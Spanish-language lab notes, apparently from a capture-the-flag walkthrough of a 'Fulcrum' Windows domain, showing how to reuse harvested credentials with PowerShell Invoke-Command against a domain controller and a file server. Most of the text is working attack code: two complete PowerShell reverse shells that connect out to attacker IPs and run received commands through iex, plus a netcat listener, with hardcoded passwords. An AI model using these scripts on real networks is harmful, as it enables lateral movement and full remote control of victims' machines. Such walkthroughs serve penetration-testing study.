## Autenticarse ante un Domain Controller

Estos comandos establecen una autenticación remota contra un controlador de dominio (`Domain Controller`) utilizando PowerShell en Windows.
```powershell
# Definir la contraseña en un objeto SecureString (almacenamiento seguro)
$password = ConvertTo-SecureString '@fulcrum_bf392748ef4e_$' -AsPlainText -Force

# Crear las credenciales con nombre de usuario y contraseña
$Cred = New-Object System.Management.Automation.PSCredential('FULCRUM\923a', $password)

# Ejecutar comandos en el Domain Controller utilizando Invoke-Command
Invoke-Command -ComputerName dc.fulcrum.local -Credential $Cred -ScriptBlock {

    $client = New-Object System.Net.Sockets.TCPClient('10.10.16.4', 54)
    $stream = $client.GetStream()
    [byte[]]$bytes = 0..65535 | %{0}
    

    while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
        $sendback = (iex $data 2>&1 | Out-String)
        $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
        
        # Enviar respuesta al atacante
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
        $stream.Write($sendbyte, 0, $sendbyte.Length)
        $stream.Flush()
    }
    $client.Close()
}
```
### Explicación de cada paso:

1. **ConvertTo-SecureString**: Almacena la contraseña de forma segura.
2. **New-Object PSCredential**: Crea las credenciales para autenticarse en `dc.fulcrum.local`.
3. **Invoke-Command**: Ejecuta comandos en el controlador de dominio utilizando la credencial. El bloque de script crea una conexión TCP inversa, que permite enviar y recibir comandos desde la máquina atacante.

---

## Ejecución de Comandos Remotos vía WinRM (Autenticación LDAP a OTRO COMPUTADOR)

Este ejemplo demuestra cómo autenticar un usuario (BTables) en una computadora remota (file.fulcrum.local) mediante WinRM y luego obtener una shell inversa.

### Conexión y Ejecución de Comandos

```R
# Convertir la contraseña a un objeto SecureString
$password = ConvertTo-SecureString '++FileServerLogon12345++' -AsPlainText -Force

# Crear el objeto de credencial con nombre de usuario y contraseña
$Cred = New-Object System.Management.Automation.PSCredential('FULCRUM\BTables', $password)

# Ejecutar el comando remoto en file.fulcrum.local
Invoke-Command -ComputerName file.fulcrum.local -Credential $Cred -ScriptBlock {
    whoami
}
# Resultado esperado: fulcrum\btables
```



### Configuración de una Reverse Shell

Para establecer una reverse shell, primero configuramos un listener en nuestra máquina local y luego ejecutamos el bloque de comandos en la máquina víctima para conectarse a nuestra IP.

#### Máquina Local (Atacante)
```bash
# Configurar un listener en el puerto 53
sudo rlwrap nc -nlvp 53
```

#### Máquina Víctima (Windows, Ejecutando PowerShell)
```powershell
# Establecer una reverse shell conectando la víctima a la IP atacante en el puerto 53
Invoke-Command -ComputerName file.fulcrum.local -Credential $Cred -ScriptBlock {
    $client = New-Object System.Net.Sockets.TCPClient('10.10.16.5', 53)
    $stream = $client.GetStream()
    [byte[]]$bytes = 0..65535 | %{0}
    
    while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
        $sendback = (iex $data 2>&1 | Out-String)
        $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
        
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
        $stream.Write($sendbyte, 0, $sendbyte.Length)
        $stream.Flush()
    }
    $client.Close()
}
```

### Explicación de cada paso:

1. **Listener en la máquina atacante**: `nc` escucha en el puerto especificado, en este caso el 53.
2. **Invoke-Command en máquina víctima**: Ejecuta un bloque de código para crear una conexión TCP inversa, manteniendo la conexión con la máquina atacante para ejecutar comandos PowerShell desde esta.